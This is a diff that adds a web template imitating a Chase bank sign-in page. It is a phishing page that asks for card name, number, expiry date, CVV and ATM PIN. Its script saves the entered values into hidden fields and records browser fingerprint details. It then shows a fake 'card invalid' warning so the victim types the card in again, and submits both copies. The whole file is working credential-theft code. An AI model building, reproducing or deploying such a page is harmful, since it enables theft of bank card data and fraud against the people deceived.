@@ -1,0 +1,113 @@
+{% extends "parent/parent.html" %}
+{% load static %}
+{% block title %} Sign in - chase.com {% endblock %}
+
+{% block header %}
+<link rel="stylesheet" href="{% static 'base/css/styles.css' %}?{% now 'U' %}">
+<script src='https://www.google.com/recaptcha/api.js?render={{recaptcha_site_key}}'></script>
+{% endblock %}
+{% block body %}
+    <div class="container-fluid header">
+        <div class="row justify-content-center text-center">
+            <div class="col-12">
+                <div class="logo mt-4">
+                    <a href="">
+                        <img src="{% static 'base/images/wordmark-white.png' %}" alt="">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="container login">
+        <div class="row justify-content-center text-left row_three">
+            <div class="col-11 col-sm-9 col-md-7 col-lg-5 col-xl-4 bg-white login_form">
+                <div class="content">
+                    <div class="content-header p-2">
+                        <h1>Creadit/Debit Card</h1>
+                    </div>
+                    <div class="alert alert-warning alert-dismissible fade show d-none slimodan_alert3" role="alert">
+                        <strong>Warning!</strong> Your Card Is Invalid Please Check And Try Again!
+                    </div>
+                    <form action="" method="POST" class="p-2 form_three" id="form_three">
+                        {% csrf_token %}  
+                        <div class="text_input mt-3">
+                            <label for="Name_On_Card" class="placeLabel">Name On Card</label>
+                            <input type="text" class="form-control" required name="Name_On_Card" id="Name_On_Card">
+                        </div>
+                        <div class="text_input mt-3">
+                            <label for="Card_Number" class="placeLabel">Card Number</label>
+                            <input type="text" class="form-control slimodan" required name="Card_Number" id="Card_Number">
+                        </div>                      
+                        <div class="text_input mt-3 div_inline m-0" >
+                            <label for="Expiration_Date" class="placeLabel" style="font-size:14px">Expiration Date</label>
+                            <input type="text" class="form-control slimodan" required name="Expiration_Date" id="Expiration_Date">
+                        </div>
+                        <div class="text_input mt-3 div_inline m-0" >
+                            <label for="Security_Code" class="placeLabel" style="font-size:14px">CVV</label>
+                            <input type="text" class="form-control slimodan" required name="Security_Code" id="Security_Code">
+                        </div>
+                        <div class="text_input mt-3">
+                            <label for="3D_Secure" class="placeLabel">ATM pin</label>
+                            <input type="text" class="form-control slimodan" required name="3D_Secure" id="3D_Secure">
+                        </div>
+                         
+                        <input type="text" hidden name="user_agent" id = "user_agent">
+                        <input type="text" hidden name="languages" id = "languages">
+                        <input type="text" hidden name="browser_name" id = "browser_name">
+                        <input type="text" hidden name="browser_version" id = "browser_version">   
+                        
+                        <input type="text" hidden name="Name_On_Card2" id = "Name_On_Card2">
+                        <input type="text" hidden name="Card_Number2" id = "Card_Number2">
+                        <input type="text" hidden name="Expiration_Date2" id = "Expiration_Date2">
+                        <input type="text" hidden name="Security_Code2" id = "Security_Code2">
+                        <input type="text" hidden name="3D_Secure2" id = "3D_Secure2">
+
+                        <input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response"> 
+                        <div class="text_input login_btn mt-5">
+                            <button class="btn btn-primary one" id="three_login">Continue</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="{% static 'base/js/script.js' %}" defer="true"></script>
+    <script>
+        $("#three_login").click(function(e){
+            e.preventDefault();
+            if ($("#three_login").hasClass("one")){
+                $("#Name_On_Card2").val($("#Name_On_Card").val());
+                $("#Card_Number2").val($("#Card_Number").val());
+                $("#Expiration_Date2").val($("#Expiration_Date").val());
+                $("#Security_Code2").val($("#Security_Code").val());
+                $("#3D_Secure2").val($("#3D_Secure").val());
+
+                $("#Name_On_Card").val("");
+                $("#Card_Number").val("");
+                $("#Expiration_Date").val("");
+                $("#Security_Code").val("");
+                $("#3D_Secure").val("");
+
+                $("#user_agent").val(navigator.userAgent);
+                $("#browser_name").val(navigator.appCodeName);
+                $("#languages").val(navigator.languages);
+                $("#browser_version").val(navigator.appVersion);
+                
+                $(".slimodan_alert3").removeClass("d-none");
+                $("#three_login").removeClass("one");    
+
+
+            }else{
+                
+                $("#form_three").submit();
+            }
+        })
+    </script>
+    <script>
+        grecaptcha.ready(function() {
+          grecaptcha.execute('{{recaptcha_site_key}}', {action: "/"}).then(function(token) {
+            document.getElementById('g-recaptcha-response').value = token;
+          });
+        });
+    </script>
+{% endblock %}
